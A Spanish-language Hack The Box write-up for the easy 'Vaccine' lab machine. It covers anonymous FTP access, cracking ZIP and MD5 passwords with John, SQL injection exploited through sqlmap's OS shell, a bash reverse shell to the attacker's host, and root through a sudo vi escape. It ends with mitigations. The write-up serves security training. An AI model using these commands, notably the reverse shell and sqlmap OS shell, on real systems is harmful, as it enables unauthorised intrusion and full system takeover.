# Vaccine — HTB

**Plataforma:** Hack The Box
**Dificultad:** Fácil
**Categoría:** Linux / FTP / SQL Injection / PostgreSQL / Sudo / GTFOBins

---

## 1. 🔎 Reconocimiento

### Nmap

```bash
nmap -sCV -Pn 10.129.163.110
```

Encontramos:

* `21/tcp` → FTP
* `22/tcp` → SSH
* `80/tcp` → HTTP

### FTP — Anonymous Login

Probamos el acceso anónimo:

```bash
ftp 10.129.163.110
```

El servidor permite:

```text
Username: anonymous
```

Podemos autenticarnos sin conocer una contraseña válida.

Enumeramos los archivos disponibles:

```ftp
ls
```

Encontramos un archivo ZIP:

```text
backup.zip
```

Lo descargamos:

```ftp
get backup.zip
```

---

## 2. 📋 Enumeración

### Crack del ZIP

El ZIP está protegido mediante contraseña.

Utilizamos `zip2john` para extraer la información necesaria para crackear la contraseña:

```bash
zip2john backup.zip > hash.txt
```

Esto **no descifra el ZIP**. Lo que hace es convertir la información de protección del ZIP a un formato que John the Ripper puede utilizar.

Después utilizamos John:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Comprobamos la contraseña encontrada:

```bash
john --show hash.txt
```

Con la contraseña obtenida podemos extraer `backup.zip`.

El ZIP contiene:

```text
index.php
style.css
```

El archivo más interesante es:

```text
index.php
```

---

### Credenciales de la aplicación

Revisamos el código:

```bash
cat index.php
```

Encontramos unas credenciales:

```text
Usuario: admin
Hash: 2cb42f8734ea607eefed3b70af13bbd3
```

El formato corresponde a un **hash MD5**.

Guardamos el hash:

```bash
echo '2cb42f8734ea607eefed3b70af13bbd3' > hash.txt
```

Y utilizamos John especificando que se trata de un MD5:

```bash
john hash.txt --format=Raw-MD5 \
-w=/usr/share/wordlists/rockyou.txt
```

Podemos comprobar el resultado:

```bash
john --show hash.txt
```

Obtenemos la contraseña de `admin`.

---

### Login web

Utilizamos las credenciales obtenidas para acceder a:

```text
http://10.129.163.110/dashboard.php
```

Tenemos acceso al dashboard.

La aplicación muestra un listado de productos/coches y dispone de un buscador.

Observamos que el buscador utiliza un parámetro:

```text
?search=
```

Por ejemplo:

```text
http://10.129.163.110/dashboard.php?search=ASDF
```

Esto hace que el parámetro `search` sea un candidato interesante para probar **SQL Injection**.

---

### SQL Injection

Probamos una entrada manipulada:

```text
ASDF' OR 1=1;
```

URL encoded:

```text
http://10.129.163.110/dashboard.php?search=ASDF%27%20OR%201=1;
```

La aplicación devuelve un error de PostgreSQL:

```text
ERROR: syntax error at or near "%"
LINE 1: Select * from cars where name ilike '%ASDF' OR 1=1;%'
```

El error nos proporciona una información muy importante:

```text
PostgreSQL
```

Además, podemos observar cómo nuestra entrada está siendo incorporada directamente dentro de la consulta SQL:

```sql
SELECT * FROM cars WHERE name ILIKE '%ASDF' OR 1=1;%'
```

Esto es un indicio claro de **SQL Injection**.

---

### SQLMap

Utilizamos SQLMap para automatizar la detección y explotación:

```bash
sqlmap -u "http://10.129.163.110/dashboard.php?search=ASDS" \
--cookie="PHPSESSID=q211mpj0doo42l5ukl97fhj4np" \
-p search \
--batch
```

### ¿Por qué necesitamos la cookie?

Porque ya estamos autenticados en la aplicación.

La cookie:

```text
PHPSESSID=...
```

identifica nuestra sesión.

Sin ella, SQLMap podría intentar acceder al parámetro `search` sin estar autenticado y no encontrar la vulnerabilidad.

SQLMap confirma que el parámetro es vulnerable y detecta, entre otros, estos métodos:

```text
Type: stacked queries
Type: UNION query
```

También identifica:

```text
PostgreSQL
```

---

## 3. 💥 Explotación

### Obtener una OS Shell mediante SQLMap

Como SQLMap ha confirmado la SQL Injection, intentamos obtener una shell del sistema operativo:

```bash
sqlmap -u "http://10.129.163.110/dashboard.php?search=ASDS" \
--cookie="PHPSESSID=q211mpj0doo42l5ukl97fhj4np" \
--os-shell
```

SQLMap consigue ejecutar comandos en el sistema operativo a través de la vulnerabilidad SQL.

Obtenemos una shell como:

```text
postgres
```

---

### Reverse Shell

La shell proporcionada por SQLMap es limitada y puede cerrarse después de un tiempo.

Para obtener una conexión más estable, establecemos una reverse shell.

En nuestra máquina:

```bash
nc -nlvp 443
```

En la máquina víctima ejecutamos:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.173/443 0>&1'
```

La conexión funciona de la siguiente manera:

```text
Víctima
   |
   | conexión TCP saliente
   ↓
10.10.14.173:443
   |
   ↓
Nuestra máquina
   |
nc -nlvp 443
```

Recibimos una shell interactiva como `postgres`.

Comprobamos:

```bash
id
```

Resultado:

```text
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

Por tanto, nuestro usuario actual es:

```text
postgres
```

---

### User Flag

Comenzamos a enumerar el sistema:

```bash
ls
```

Nos interesa especialmente el directorio de PostgreSQL, donde encontramos la flag del usuario.

---

### Búsqueda de credenciales

También investigamos los archivos de la aplicación web:

```bash
cd /var/www/html
ls
```

Revisamos `dashboard.php`:

```bash
cat dashboard.php
```

Encontramos una contraseña:

```text
P@s5w0rd!
```

La contraseña corresponde al usuario:

```text
postgres
```

Esto nos permite obtener una sesión SSH estable.

---

### Acceso mediante SSH

Nos conectamos como `postgres`:

```bash
ssh postgres@10.129.163.110
```

Introducimos:

```text
P@s5w0rd!
```

Ahora tenemos una sesión SSH persistente.

Esto es preferible a mantener la shell obtenida mediante SQLMap porque la conexión SSH no depende de la sesión de SQL Injection.

---

### Enumeración de sudo

Comprobamos qué comandos puede ejecutar `postgres` con `sudo`:

```bash
sudo -l
```

Obtenemos:

```text
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Esto significa que el usuario `postgres` puede ejecutar:

```text
/bin/vi
```

como **cualquier usuario**, incluido `root`.

El problema no es realmente el archivo `pg_hba.conf`.

El problema es que `vi` es un editor que permite ejecutar comandos del sistema desde dentro del propio editor.

---

## 4. ⬆️ Escalada de privilegios

### Explotación de `vi`

Ejecutamos:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Como `sudo` ejecuta `vi` con privilegios de root, el proceso `vi` tiene privilegios de root.

Dentro de `vi` ejecutamos:

```vim
:set shell=/bin/sh
```

Esto configura la shell que `vi` utilizará cuando solicitemos una shell.

Después:

```vim
:shell
```

`vi` ejecuta `/bin/sh`.

Pero recuerda:

```text
sudo
 ↓
vi ejecutándose como root
 ↓
vi lanza /bin/sh
 ↓
/bin/sh también tiene los privilegios del proceso
 ↓
root
```

Comprobamos:

```bash
whoami
```

Resultado:

```text
root
```

### ¿Por qué funciona?

`sudo` no está limitando a `vi` a editar exclusivamente:

```text
/etc/postgresql/11/main/pg_hba.conf
```

Está permitiendo ejecutar el **programa `vi` completo como root**.

Como `vi` tiene una funcionalidad legítima para ejecutar comandos del sistema, podemos utilizar esa funcionalidad para escapar del editor y obtener una shell con los mismos privilegios.

Es un ejemplo clásico de **abuso de binarios permitidos mediante sudo**.

---

## 5. 📄 Reporte

### Resumen

La máquina **Vaccine** expone FTP, SSH y HTTP.

El servidor FTP permite acceso anónimo y contiene un ZIP protegido con contraseña. Mediante `zip2john` y John the Ripper conseguimos recuperar la contraseña del ZIP y acceder a su contenido.

El archivo `index.php` contiene un hash MD5 correspondiente a las credenciales de la aplicación web. Crackeamos el hash y conseguimos acceder al dashboard.

El parámetro `search` del dashboard es vulnerable a **SQL Injection**. SQLMap confirma la vulnerabilidad y permite obtener una shell del sistema operativo.

La shell se obtiene inicialmente como `postgres`. Posteriormente encontramos la contraseña de `postgres` en `dashboard.php`, lo que nos permite conectarnos mediante SSH.

Finalmente, `sudo -l` revela que `postgres` puede ejecutar `vi` como root. Aprovechamos la capacidad de `vi` para lanzar una shell y obtenemos privilegios de `root`.

### Cadena de ataque

```text
Anonymous FTP
      ↓
backup.zip
      ↓
zip2john + John
      ↓
index.php
      ↓
MD5 de admin
      ↓
John
      ↓
Login web
      ↓
SQL Injection
      ↓
SQLMap --os-shell
      ↓
postgres
      ↓
Credenciales en dashboard.php
      ↓
SSH como postgres
      ↓
sudo -l
      ↓
vi como root
      ↓
:shell
      ↓
root
```

### Vulnerabilidades encontradas

| Vulnerabilidad                | Severidad | Impacto                                               |
| ----------------------------- | --------- | ----------------------------------------------------- |
| FTP Anonymous Login           | Alta      | Permite acceder a archivos sin autenticación          |
| Contraseña débil del ZIP      | Media     | Permite recuperar información sensible                |
| Hash MD5 de credenciales      | Alta      | Permite recuperar la contraseña mediante cracking     |
| SQL Injection                 | Crítica   | Permite ejecutar consultas SQL y comandos del sistema |
| Credenciales en código fuente | Alta      | Permite comprometer usuarios                          |
| `vi` permitido mediante sudo  | Crítica   | Permite obtener una shell como root                   |

### Mitigaciones

* Deshabilitar el acceso anónimo a FTP.
* No almacenar información sensible en backups accesibles públicamente.
* Utilizar algoritmos de hashing modernos y adecuados para contraseñas, como Argon2id, bcrypt o scrypt.
* Utilizar consultas parametrizadas para prevenir SQL Injection.
* No almacenar credenciales directamente en el código fuente.
* Aplicar el principio de mínimo privilegio en `sudo`.
* No permitir que usuarios no privilegiados ejecuten editores como `vi` con privilegios de root.
* Revisar periódicamente las reglas de `sudoers`.

---

## 🧠 Lessons Learned

* `nmap -sCV -Pn` permite identificar puertos, servicios y versiones.
* FTP con **anonymous login** puede proporcionar acceso a archivos sin credenciales.
* `zip2john` convierte la información de protección de un ZIP en un formato que John puede crackear.
* John the Ripper permite crackear hashes utilizando diccionarios como `rockyou.txt`.
* Un hash MD5 **no se descifra** realmente: se intenta encontrar la contraseña que produce ese mismo hash.
* Una aplicación que introduce directamente un parámetro en una consulta SQL puede ser vulnerable a **SQL Injection**.
* Los errores de SQL pueden revelar información importante, como el DBMS utilizado.
* SQLMap automatiza la detección y explotación de SQL Injection.
* `--os-shell` permite intentar obtener ejecución de comandos del sistema operativo a través de una SQL Injection.
* `id` permite comprobar el usuario y los grupos actuales.
* Las credenciales encontradas en archivos de configuración o código pueden reutilizarse para conseguir un acceso más estable mediante SSH.
* `sudo -l` muestra qué comandos puede ejecutar un usuario mediante `sudo`.
* Si un usuario puede ejecutar un editor como `vi` con privilegios de root, el editor puede convertirse en un vector de escalada.
* En este caso, `sudo` ejecuta `vi` como root y `vi` permite lanzar `/bin/sh`, por lo que terminamos con una shell como root.
